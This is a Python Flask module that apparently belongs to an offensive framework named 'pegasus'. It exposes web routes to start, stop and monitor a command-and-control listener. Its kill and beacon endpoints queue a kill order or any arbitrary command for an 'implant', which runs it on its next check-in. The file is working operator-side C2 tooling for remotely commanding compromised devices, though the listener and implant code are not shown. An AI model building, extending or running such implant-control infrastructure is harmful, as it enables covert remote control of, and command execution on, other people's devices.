"""C2 console routes for the main web backend.

The console's Start/Stop/Kill buttons POST to /api/c2/*, but those routes only
ever existed on the separate access_workflow dashboard server, so every button
404'd against this app. The real listener already exists in
``pegasus.modules.c2.server``; this module exposes it to the console and reports
the port the listener actually bound rather than echoing the requested one.

Bind posture: loopback by default, matching the console. ``POST /api/c2/start``
accepts a ``host``, which is validated against the three wildcard/loopback
sentinels plus the host's own interface addresses, so a typo cannot produce an
unbindable listener. ``PEGASUS_C2_TLS`` enables TLS for ``wss://`` clients.
"""
from __future__ import annotations

import os
import socket
import time

from flask import request

_STATE: dict = {"running": False, "port": None, "host": None, "started_at": None,
                "autostarted": False}

_ALWAYS_OK = {"127.0.0.1", "0.0.0.0", "::1", "::"}


def _local_addresses() -> set[str]:
    addrs = set(_ALWAYS_OK)
    try:
        import psutil
        for _, entries in psutil.net_if_addrs().items():
            for entry in entries:
                addr = getattr(entry, "address", None)
                if addr:
                    addrs.add(str(addr).split("%")[0])
    except Exception:
        try:
            addrs.add(socket.gethostbyname(socket.gethostname()))
        except Exception:
            pass
    return addrs


def _resolve_host(value) -> str | None:
    """None means 'use the configured default'. Raises ValueError on a typo."""
    raw = str(value or "").strip()
    if not raw:
        return None
    if raw in _local_addresses():
        return raw
    raise ValueError(
        "host %r is not a local interface address; use 127.0.0.1, 0.0.0.0, "
        "::1 or one of: %s" % (raw, ", ".join(sorted(_local_addresses())))
    )


def _uptime() -> str:
    if not _STATE["running"] or not _STATE["started_at"]:
        return "—"
    secs = int(time.time() - _STATE["started_at"])
    if secs < 60:
        return f"{secs}s"
    if secs < 3600:
        return f"{secs // 60}m{secs % 60:02d}s"
    return f"{secs // 3600}h{(secs % 3600) // 60:02d}m"


def _clients() -> int:
    """Number of DNA identities currently bound to a run."""
    try:
        from pegasus.modules.c2 import registry
        return len(registry._BY_DNA)
    except Exception:
        return 0


def start_listener(port: int, autostarted: bool = False,
                   host: str | None = None) -> dict:
    """Start the real C2 listener and record its bound port and host."""
    from pegasus.modules.c2 import server

    if _STATE["running"]:
        return {"started": True, "port": _STATE["port"], "host": _STATE["host"],
                "already_running": True, "uptime": _uptime(),
                "connected_clients": _clients(), "tls": server.tls_enabled()}
    bound_host = host or server.c2_host()
    bound = server.start(port, bound_host)
    _STATE.update(running=True, port=int(bound), host=bound_host,
                  started_at=time.time(), autostarted=autostarted)
    return {"started": True, "port": int(bound), "host": bound_host,
            "already_running": False, "uptime": _uptime(),
            "connected_clients": _clients(), "autostarted": autostarted,
            "tls": server.tls_enabled()}


def stop_listener() -> dict:
    from pegasus.modules.c2 import server

    was = _STATE["running"]
    if was:
        server.stop()
    _STATE.update(running=False, port=None, host=None, started_at=None,
                  autostarted=False)
    return {"stopped": bool(was), "was_running": bool(was)}


def maybe_autostart() -> dict | None:
    """Honour PEGASUS_C2_AUTOSTART so the listener comes up with the app.

    Called from start_server.py AFTER the main app is listening - starting a
    second WSGI listener inside create_app() stops the backend serving.
    """
    raw = os.environ.get("PEGASUS_C2_AUTOSTART", "1").strip().lower()
    if raw in ("0", "false", "no", "off", ""):
        return None
    try:
        port = int(os.environ.get("PEGASUS_C2_PORT", "8080"))
    except ValueError:
        port = 8080
    try:
        return start_listener(port, autostarted=True)
    except OSError as exc:
        # A busy or unbindable port must not take the whole console down.
        return {"started": False, "error": str(exc), "port": port}


def register(app, ok, fail):
    @app.get("/api/c2/status")
    def c2_status():
        from pegasus.modules.c2 import server
        return ok({
            "running": _STATE["running"],
            "port": _STATE["port"],
            "host": _STATE["host"],
            "bind_default": server.c2_host(),
            "tls": server.tls_enabled(),
            "uptime": _uptime(),
            "connected_clients": _clients(),
            "autostarted": _STATE["autostarted"],
            "autostart_enabled": os.environ.get(
                "PEGASUS_C2_AUTOSTART", "1").strip().lower()
                not in ("0", "false", "no", "off", ""),
        })

    @app.post("/api/c2/start")
    def c2_start():
        body = request.get_json(silent=True) or {}
        try:
            port = int(body.get("port") or os.environ.get("PEGASUS_C2_PORT") or 0)
        except (TypeError, ValueError):
            return fail("port must be numeric")
        if port < 0 or port > 65535:
            return fail("port out of range")
        try:
            host = _resolve_host(body.get("host"))
        except ValueError as exc:
            return fail(str(exc))
        try:
            return ok(start_listener(port, host=host))
        except OSError as exc:
            return fail(f"cannot bind C2 listener: {exc}", 500)

    @app.post("/api/c2/stop")
    def c2_stop():
        return ok(stop_listener())

    @app.post("/api/c2/kill")
    def c2_kill():
        """Queue a kill command for an implant and unbind its run.

        The command is delivered on the implant's next signed beacon; this does
        not reach out to the device directly. The console sends ``serial`` but
        the queue is keyed by DNA, so either identifier is accepted.
        """
        body = request.get_json(silent=True) or {}
        ident = str(body.get("dna") or body.get("serial") or "").strip()
        if not ident:
            return fail("dna or serial required")
        from pegasus.modules.c2 import queue, registry

        cid = queue.push(ident, "kill")
        run_id = registry.run_for(ident)
        if run_id:
            registry.unbind(run_id)
        return ok({"queued": True, "cid": cid, "identifier": ident,
                   "unbound_run": run_id,
                   "note": "delivered on the implant's next beacon"})

    @app.post("/api/c2/beacon")
    def c2_queue_command():
        """Queue an arbitrary command for an implant (operator-facing)."""
        body = request.get_json(silent=True) or {}
        ident = str(body.get("dna") or body.get("serial") or "").strip()
        command = str(body.get("command") or "").strip()
        if not ident:
            return fail("dna or serial required")
        if not command:
            return fail("command required")
        from pegasus.modules.c2 import queue

        return ok({"queued": True, "cid": queue.push(ident, command),
                   "identifier": ident})
